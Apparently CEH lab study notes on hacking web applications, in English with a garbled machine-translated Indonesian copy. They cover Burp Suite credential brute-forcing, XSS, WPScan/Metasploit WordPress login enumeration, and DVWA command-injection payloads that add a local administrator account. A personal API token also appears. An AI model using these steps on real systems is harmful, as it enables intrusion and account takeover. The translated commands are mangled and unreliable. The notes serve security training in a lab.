# Bagian 01: Web Applications Concepts/Konsep Aplikasi Web

**Modul 14: Hacking Web Applications/Meretas Aplikasi Web**

**Lab2-Task1: Perform a Brute-force Attack using Burp Suite/Melakukan Serangan Brute-force menggunakan Burp Suite**

- Set proxy for browser: 127.0.0.1:8080
- Burpsuite
- Type random credentials
- capture the request, right click-\&gt;send to Intrucder
- Intruder-\&gt;Positions
- Clear $
- Attack type: Cluster bomb
- select account and password value, Add $
- Payloads: Load wordlist file for set 1 and set 2
- start attack
- **filter status==302**
- open the raw, get the credentials
- recover proxy settings

---------------------------------------
atau saya harus menulisnya dengan bahasa indonesia agar mudah di mengerti:

- Atur proksi untuk browser: 127.0.0.1:8080
- bersendawa
- Ketikkan kredensial acak
- tangkap permintaan, klik kanan-\&gt;kirim ke Intrucder
- Penyusup-\&gt;Posisi
- Hapus $
- Jenis serangan: Bom cluster
- pilih nilai akun dan kata sandi, Tambahkan $
- Payloads: Muat file daftar kata untuk set 1 dan set 2
- mulai menyerang
- **status filter==302**
- buka mentahnya, dapatkan kredensialnya
- memulihkan pengaturan proxy

**Lab2-Task3: Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications/Memanfaatkan Gangguan Parameter dan Kerentanan XSS di Aplikasi Web**

- Log in a website, change the parameter value (id )in the URL
- Conduct a XSS attack: Submit script codes via text area
------------------------------

- Masuk ke situs web, ubah nilai parameter (id) di URL
- Melakukan serangan XSS: Kirimkan kode skrip melalui area teks

**Lab2-Task5: Enumerate and Hack a Web Application using WPScan and Metasploit/Menghitung dan Meretas Aplikasi Web menggunakan WPScan dan Metasploit**


- **wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads --url**  **http://10.10.10.16:8080/CEH**  **--plugins-detection aggressive --enumerate u**
  - **--enumerate u: Specify the enumeration of users**
  - **API Token: Register at** [**https://wpscan.com/register**](https://wpscan.com/register)
  - **Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads**
- service postgresql start
- msfconsole
- **use auxiliary/scanner/http/wordpress\_login\_enum**
- show options
- **set PASS\_FILE password.txt**
- **set RHOST 10.10.10.16**
- **set RPORT 8080**
- **set TARGETURI**  **http://10.10.10.16:8080/CEH**
- **set USERNAME admin**
- run
- Find the credential
--------------------------------------

- **wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads --url** **http://10.10.10.16:8080/CEH** **--plugins-detection agresif --enumerate u**
 - **--enumerate u: Tentukan enumerasi pengguna**
 - **Token API: Daftar di** [**https://wpscan.com/register**](https://wpscan.com/register)
 - **Punyaku: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads**
- layanan postgresql dimulai
- msfconsole
- **gunakan alat bantu/pemindai/http/wordpress\_login\_enum**
- tampilkan opsi
- **atur PASS\_FILE kata sandi.txt**
- **setel RHOST 10.10.10.16**
- **atur RPORT 8080**
- **tetapkan TARGETURI** **http://10.10.10.16:8080/CEH**
- **setel admin NAMA PENGGUNA**
- berlari
- Temukan kredensialnya

**Lab2-Task6: Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server (DVWA low level security)/Memanfaatkan Kerentanan Eksekusi Perintah Jarak Jauh untuk Membobol Server Web Target (keamanan tingkat rendah DVWA)**


- If found command injection vulnerability in an input textfield
- | hostname
- | whoami
- **| tasklist| Taskkill /PID /F**
  - **/PID: Process ID value od the process**
  - **/F: Forcefully terminate the process**
- | dir C:\
- **| net user**
- **| net user user001 /Add**
- **| net user user001**
- **| net localgroup Administrators user001 /Add**
- Use created account user001 to log in remotely

------------------------------------------------------------

- Jika ditemukan kerentanan injeksi perintah di kolom teks input
- | nama host
- | siapa saya
- **| daftar tugas| Pembunuhan Tugas /PID /F**
 - **/PID: Nilai ID proses dari proses**
 - **/F: Menghentikan proses secara paksa**
- | direktori C:\
- **| pengguna bersih**
- **| pengguna bersih pengguna001 /Tambahkan**
- **| pengguna bersih pengguna001**
- **| administrator grup lokal bersih pengguna001 /Tambahkan**
- Gunakan akun yang dibuat user001 untuk login dari jarak jauh

-------------------------------------------------------------

## Konsep
aplikasi web

[Definisi](../definitions/definitions_W.md#web-application)

Uniform resource locator (URL)/Pencari sumber daya seragam (URL)

[Definisi](../definitions/definitions_U.md#uniform-resource-locator)
